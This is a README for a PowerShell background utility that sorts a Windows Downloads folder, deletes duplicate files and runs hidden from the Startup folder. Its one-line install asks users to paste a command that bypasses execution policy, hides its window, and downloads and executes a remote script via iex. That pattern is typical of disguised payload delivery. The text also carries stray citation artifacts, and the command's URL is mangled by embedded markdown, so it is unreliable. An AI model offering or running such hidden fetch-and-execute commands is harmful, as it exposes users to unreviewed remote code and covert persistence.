# 📂 Downloads Folder Sorter (Autonomous Edition)

A high-efficiency, low-power background service that keeps your Downloads folder organized 24/7. It utilizes exhaustive file-type mapping and content-based duplicate detection to manage your digital workspace silently.

## 🛠️ What Does This Script Do?

This system operates as a "set-and-forget" Windows service with the following logic:

- [cite_start]**Autonomous Sorting**: Monitors your `Downloads` folder every 5 minutes and moves files to dedicated subdirectories in `Documents`, `Pictures`, `Music`, and `Videos`[cite: 4].
- [cite_start]**Deep File Mapping**: Includes custom paths for over 100+ extensions, including specialized folders for **Autodesk AutoCAD/3ds Max**, **Adobe Creative Cloud** (Photoshop, Illustrator, Premiere, etc.), and **Microsoft Office**[cite: 4].
- [cite_start]**Media Date-Sorting**: Automatically groups Photos, Music, and Videos into folders formatted as `[InvertedYear] MMM-DD-YY` (e.g., `[7974] Apr-11-26`) so the newest downloads always appear at the top[cite: 4].
- [cite_start]**Intelligent Duplicate Removal**: Uses SHA256 hashing to identify and delete exact bit-for-bit duplicate files before they are moved, saving disk space[cite: 4].
- [cite_start]**In-Progress Protection**: Smart-filters out temporary browser files (`.crdownload`, `.tmp`, `.part`) to ensure files are only moved once the download is 100% complete[cite: 4].
- **System Efficiency**: Runs at `Idle` CPU priority. [cite_start]It waits for the processor to be "bored" before performing tasks, ensuring zero lag in your Engineering apps or games[cite: 4].
- [cite_start]**Recursive Cleanup**: Performs a 5-pass deep-scan to delete empty nested folders left behind after sorting[cite: 4].

## 🚀 One-Liner Installation

Install and hide the service instantly. Press **Win + R**, paste the following, and hit **Enter**:

```powershell
powershell -ep bypass -w hidden -c "iwr '[https://gist.githubusercontent.com/psychiotric-sudo/1534904084065cf659117ab4fb56c12f/raw/5464f7d23460de78f1de9a9784a3785f3123576e/Initialize-DownloadsSorter.ps1](https://gist.githubusercontent.com/psychiotric-sudo/1534904084065cf659117ab4fb56c12f/raw/5464f7d23460de78f1de9a9784a3785f3123576e/Initialize-DownloadsSorter.ps1)' | iex"
```

## 📂 File Structure

[cite_start]The installation creates a hidden folder in your Documents to keep the "engine" out of sight[cite: 6]:

- [cite_start]`Documents\DownloadsFolderSorter\` (Hidden) [cite: 6]
  - `bin\Sort-DownloadsFolder.ps1`: The core PowerShell engine.
  - [cite_start]`bin\Run-SortDownloadsHidden.vbs`: The silent invoker that hides the terminal window[cite: 4].

## 📝 Manual Setup

1.  Place **`Sort-DownloadsFolder.ps1`** and **`Run-SortDownloadsHidden.vbs`** in a folder.
2.  [cite_start](Optional) Run `attrib +h "YourFolderName"` to hide it[cite: 6].
3.  Create a shortcut of **`Run-SortDownloadsHidden.vbs`**.
4.  Move that shortcut to your Windows Startup folder: `shell:startup`.

## ⚙️ Requirements

- **OS**: Windows 10/11
- **PowerShell**: 5.1 or higher (standard on Windows)

## ⚖️ License

MIT
